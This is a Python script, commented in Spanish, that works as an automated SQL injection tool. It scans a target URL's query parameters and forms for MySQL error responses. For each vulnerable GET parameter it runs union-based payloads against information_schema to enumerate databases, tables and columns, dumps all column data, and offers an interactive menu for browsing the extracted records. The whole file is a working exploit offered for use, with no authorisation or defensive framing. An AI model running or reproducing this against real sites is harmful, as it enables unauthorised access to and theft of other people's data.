import requests
import sys
import re
import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urlparse, urljoin
from prettytable import PrettyTable

s = requests.Session()
# Creo el User-Agent que voy a usar
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

class bcolors:
    HEADER = '\033[95m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def banner():
    print("\n--------------------------------------------------------------------------------------------------------------------------------")
    print(bcolors.HEADER)
    print("  ▄████████ ████████▄    ▄█        ▄█          ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████  ")
    print("  ███    ███ ███    ███  ███       ███         ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ ")
    print("  ███    █▀  ███    ███  ███       ███▌        ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ ")
    print("  ███        ███    ███  ███       ███▌        ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ")
    print("▀███████████ ███    ███  ███       ███▌      ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ")
    print("         ███ ███    ███  ███       ███                ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ ")
    print("   ▄█    ███ ███  ▀ ███  ███▌    ▄ ███          ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ ")
    print(" ▄████████▀   ▀██████▀▄█ █████▄▄██ █▀         ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███ ")
    print("                         ▀                                                                                           ███    ███ ")
    print(bcolors.ENDC)
    print("----------------------------------------------------- By MainDavis -------------------------------------------------------------\n\n")

def comprobarURL(url):
    #Compruebo que se ha metido el http o https para que no de errores

    if ("http://" in url) or ("https://" in url):
        return True
    else:
        return False

def vulnerable(response):
    #Verifico y si el html tiene uno de los errores
    errorsMySQL = { "warning: mysql", "you have an error in your sql syntax", "error executing query" }

    for error in errorsMySQL:
        
        if error in response:
            return True

    return False


def scanGETSQLI(url):
    #Funcion para poner a prueba el metodo GET poniendo comillas en cada parametro y probando
    print(bcolors.WARNING + "[!] Probando SQLI en url")

    vulv_parameters = []
    parse = urlparse(url)
    parameters = parse.query.split('&')
    
    if parameters[0] == "":
        return []

    for parameter in parameters:
        for c in "\"'":   
            new_url = url.replace(parameter, parameter + c)
            res = s.get(new_url).content.decode().lower()
            print(bcolors.WARNING + "[!] Probando", new_url)

            if vulnerable(res):
                print(bcolors.OKGREEN + "[+] Vulnerable el parametro " + parameter.split('=')[0])
                vulv_parameters.append(parameter.split('=')[0] + c)
    return vulv_parameters


def scanPOSTSQLI(url):

    print(bcolors.WARNING + "\n[!] Probando SQLI en forms")
    
    forms = getFormsURL(url)
    
    if len(forms) > 0:

        print(bcolors.OKGREEN + "[+] Encontrados", len(forms), "formularios en la pagina.")
        
        for form in forms:

            info_form = getInfoForm(form)

            for c in "\"'":
                
                #Datos que vamos a enviar
                datos = {}

                for input_tag in info_form['inputs']:
                    
                    #Si el input esta oculto o tiene valor
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        try:
                            datos[input_tag["name"]] = input_tag["value"] + c
                        except:
                            pass
                    
                    #A todos los demas se añade algo con comillas
                    elif input_tag["type"] != "submit":
                        datos[input_tag["name"]] = "var" + c
                
                url = urljoin(url, info_form["action"])
            
                res = ""
                
                if info_form["method"] == "post":
                    res = s.post(url, data=datos).content.decode().lower()
                elif info_form["method"] == "get":
                    res = s.get(url, params=datos).content.decode().lower()
                

                if vulnerable(res):
                    print(bcolors.OKGREEN + "\n[+] Vulnerabilidad detectada en el form:\n")
                    pp = pprint.PrettyPrinter()
                    pp.pprint(info_form)
                    break

    else:

        print(bcolors.FAIL + "\n\t[-] No se han encontrado formularios en la pagina.")


def getFormsURL(url):
    #Busca y recopila todos los forms
    print(bcolors.WARNING + "[!] Buscando formularios.")
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def getInfoForm(form):
    #Analiza el form introducido para sacar la informacion

    #Form action

    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    
    #Form method

    method = form.attrs.get("method", "get").lower()

    #Informacion de los inputs

    inputs = []

    for input_tag in form.find_all("input"):

        input_name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type","text")
        input_value = input_tag.attrs.get("value", "")

        inputs.append({"name":input_name, "type":input_type, "value":input_value})

    info = {

            "action":action,
            "method":method,
            "inputs":inputs
    }

    return info

def recopilarInfoURL(vulv_url, url):
    print(bcolors.WARNING + "\n[!] Sacando informacion")
    for param in vulv_url:
        c = param[-1]
        # Ahora toca ver de que tipoc es el parametro
        # Primero probamos con un payload de tipo int
        print(url, param[0:-1])
        payload = url.replace(param[0:-1] + "=", param[0:-1]+"=1 order by 1000 -- -")
        res = s.get(payload).content.decode().lower()
        print(bcolors.WARNING + "[!] Ejecutando payload:", payload)
        
        if 'unknown column' not in res:
            # Ahora probamos con un String con comillas dobles
            payload = url.replace(param[0:-2], param[0:-1]+'=1" order by 1000 -- -')
            res = s.get(payload).content.decode().lower()
            print("[!] Ejecutando payload:", payload)

            if 'unknown columm' not in res:
                # Por ultimo probamos comillas simples
                payload = url.replace(param[0:-2], param[0:-1]+"=1' order by 1000 -- -")
                res = s.get(payload).content.decode().lower()
                print("[!] Ejecutando payload:", payload)

                if 'unknown column' not in res:
                    print(bcolors.FAIL + "[-] No ha funcionado nunguna prueba")
                    continue
                else:
                    tipo = "str'"
            else:
                tipo = 'str"'
        else:
            tipo = "int"

        print(bcolors.OKGREEN + "[+] Pruebas con exito en el parametro", param[0:-1], "con el tipo", tipo)
            
        # Ahora saco cuantos parametros tiene la consulta
        
        for i in range(1,101):
            payloadInfo = payload.replace("order by 1000", "order by " + str(i))
            print(bcolors.WARNING + "[!] Utilizando payload: " + payloadInfo)
            res = s.get(payloadInfo).content.decode().lower()

            if vulnerable(res):
                print(bcolors.OKGREEN + "[+] Encontrado numero de parametros:", i-1)
                n_parametros = i-1
                break
        
        #Una vez tengo el numero de parametro busco uno que se refleje en la pagina
        print(bcolors.WARNING + "[!] Buscando parametros que se reflejen")
        parameters = ""
        for i in range(0,n_parametros):
            if i == n_parametros-1:
                parameters = parameters + '"parametro' + str(i) + '"'
            else:
                parameters = parameters + '"parametro' + str(i) + '",'
        payload = payload.replace("order by 1000", "and 1=0 union select " + parameters)
        
        print(bcolors.WARNING + "[!] Utilizando payload: " + payload)
        
        res = s.get(payload).content.decode().lower()
        
        index_parametro = -1
        for i in range(0,n_parametros):
            keyword = '>parametro' + str(i)
            if keyword in res:
                print(bcolors.OKGREEN + "[+] El parametro con el indice", i, "se refleja")
                index_parametro = i
                break
        if index_parametro == -1:
            print(bcolors.FAIL + "[-] No se ha encontrado ningun parametro que se refleje")
            break
        
        #Una vez se el numero de parametro y el indice de uno que se refleje ya puedo sacar toda la informacion que quiera
        print(bcolors.WARNING + "\n[!] Sacando informacion de la base de datos")

        informacionTotal = {}

        # Primero saco las bases de datos que hay
        keyword = '"parametro' + str(index_parametro) + '"'
        payloadInfo = payload.replace(keyword, 'group_concat("<SQLI>",schema_name,"</SQLI>")')
        payloadInfo = payloadInfo.replace("-- -", "from information_schema.schemata -- -")
        print(bcolors.WARNING + "[!] Utilizando payload:", payloadInfo)
        
        soup = bs(s.get(payloadInfo).content, "html.parser")
        
        #Limpio la salida
        soup = soup.find_all('sqli')
        databases = []
        for w in soup:
            databases.append(w.text)
        
        if len(databases) == 0:
            print(bcolors.FAIL + "[-] Ha ocurrido un error sacando las bases de datos")
            return

        print(bcolors.OKGREEN + "[+] Se han encontrado", len(databases), "bases de datos:", databases)
        
        # Ahora saco las tablas de cada base de datos
        for database in databases:
            if database != "information_schema":
                payload = payloadInfo.replace("schema_name", "table_name")
                print(bcolors.WARNING + "\n[!] Buscando el nombre de las tablas de " + database)
                payload = payload.replace("schemata", "tables where table_schema='"+database+"'")
                print(bcolors.WARNING + "[!] Utilizando el payload: " + payload )

                soup = bs(s.get(payload).content, "html.parser")
                soup = soup.find_all('sqli')
                table_names = []
                for w in soup:
                    table_names.append(w.text)
                print(bcolors.OKGREEN + "[+] Se han encontrado", len(table_names), "tablas:", table_names)
                
                # Creo la informacion
                informacionTotal[database] = {}
                
                # Ahora saco las columnas de cada tabla
                
                for tabla in table_names:
                    print(bcolors.WARNING + "\n[!] Buscando las columnas de la tabla " + tabla)
                    payload = payloadInfo.replace("schema_name", "column_name")
                    payload = payload.replace("schemata", "columns where table_name='" + tabla + "'")
                    print(bcolors.WARNING + "[!] Utilizando el payload: " + payload)

                    soup = bs(s.get(payload).content, "html.parser")
                    soup = soup.find_all('sqli')
                    columns = []
                    for w in soup:
                        columns.append(w.text)
                    print(bcolors.OKGREEN + "[+] Se han encontrado", len(columns) , "columnas:", columns)
                    
                    #Creo la informacion
                    informacionTotal[database][tabla] = {}

                    # Ahora saco los datos de cada columna
                    
                    for column in columns:
                        print(bcolors.WARNING + "\n[!] Buscando los datos de la columna " + column)
                        payload = payloadInfo.replace("schema_name", column)
                        payload = payload.replace("information_schema.schemata", database + "." + tabla)
                        print(bcolors.WARNING + "\n[!] Utilizando el payload: " + payload)

                        soup = bs(s.get(payload).content, "html.parser")
                        soup = soup.find_all('sqli')
                        data = []
                        
                        for w in soup:
                            data.append(w.text)
                        print(bcolors.OKGREEN + "[+] Se han encontrado", len(data), "datos: ", data)
                                
                        # Fusiono toda la informacion
                        informacionTotal[database][tabla][column] = data

        return informacionTotal        
        
def menu(info):
    print(bcolors.OKGREEN + "[+] Terminado el proceso de analisis de la pagina\n\n" + bcolors.ENDC)
    
    database = ""
    
    exec = True

    while exec:

        if database == "":
            print("\nSelecciona una opcion:\n")
            print("\t1. Seleccionar base de datos")
            print("\t2. Ver base de datos")
            print("\t3. Salir\n")

            op = int(input("-> "))
            
            if op == 1 or op == 2:
                comprobar=True
                while comprobar:
                    print("\nSelecciona una de las siguientes bases de datos:",end=' ')
                    for db in info:
                        print(db, end=' ')
                    
                    txt_input = input("\n\n-> ")
                    
                    if txt_input in info:
                        comprobar = False
                
                if op == 1:
                    database = txt_input
                else:
                    t = PrettyTable([txt_input])
                    for w in info[txt_input]:
                        t.add_row([w])
                    print("\n", t)

            elif op == 3:
                exec = False

        else:
            print("\nSelecciona una opcion:\n")
            print("\t1. Ver tabla")
            print("\t2. Volver a seleccion de base de datos")
            print("\t3. Salir\n")
            
            op = int(input("[" + database + "] -> "))

            if op == 1:
                comprobar=True
                while comprobar:
                    print("\nSelecciona una de las siguientes tablas:", end=' ')
                    for tb in info[database]:
                        print(tb, end=' ')

                    txt_input = input("\n\n[" + database + "] -> ")

                    if txt_input in info[database]:
                        comprobar = False
                
                #Imprimo la tabla
                t = PrettyTable()
                for column in info[database][txt_input]:
                    t.add_column(column, info[database][txt_input][column])
                print(t)

            elif op == 2:
                database = ""

            elif op == 3:
                exec = False
                        

if __name__ == "__main__":
    
    url = sys.argv[1]

    if comprobarURL(url):
    
        banner()

        print(bcolors.WARNING + "[!] Utilizando la url: " + url + "\n")
        
        vulv_url = scanGETSQLI(url)
        
        vulv_form = scanPOSTSQLI(url)
        
        informacionTotal = {}

        if len(vulv_url) > 0:
            informacionTotal = recopilarInfoURL(vulv_url, url)

        # No está hecha la parte de vulnerar por Post
        #if len(vulv_form) > 0 and len(informacionTotal)==0:
        #    recopilarInfoForm(vulv_form, url)

        if len(informacionTotal)>0:
            menu(informacionTotal)
        else:
            print(bcolors.FAIL + "\n[-] No se ha encontrado ningun tipo de informacion")

    else:

        print(bcolors.FAIL + "\n[-] No has introducido bien la url, añade http:// o https://")